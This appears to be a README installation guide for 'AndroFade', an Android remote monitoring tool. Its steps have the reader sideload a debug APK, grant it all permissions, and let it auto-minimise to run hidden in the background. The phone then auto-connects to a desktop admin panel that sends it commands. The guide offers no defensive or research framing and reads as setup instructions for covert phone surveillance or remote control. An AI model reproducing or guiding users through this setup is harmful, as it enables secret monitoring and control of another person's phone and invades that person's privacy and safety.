# 🔍 AndroFade - Complete Remote Monitoring System

## ✅ SYSTEM READY - INSTALLATION GUIDE

### 📱 STEP 1: Phone Installation

```
1. Go to: https://github.com/oybekdev07/androfade/releases
2. Download: app-debug.apk
3. Transfer APK to phone
4. File Manager → app-debug.apk → Install
5. [Allow All Permissions]
6. App auto-minimize (1 second)
7. Service running in background ✓
```

### 💻 STEP 2: Computer Server

```bash
# Download AdminPanel.jar from releases
# Run command:
java -jar AdminPanel.jar

# Admin Panel opens automatically
# Waiting for phone connection...
```

### ✅ STEP 3: Connection

```
- Phone auto-connects to server
- Device appears in Admin Panel
- Status: 🟢 Online
- Ready to send commands!
```
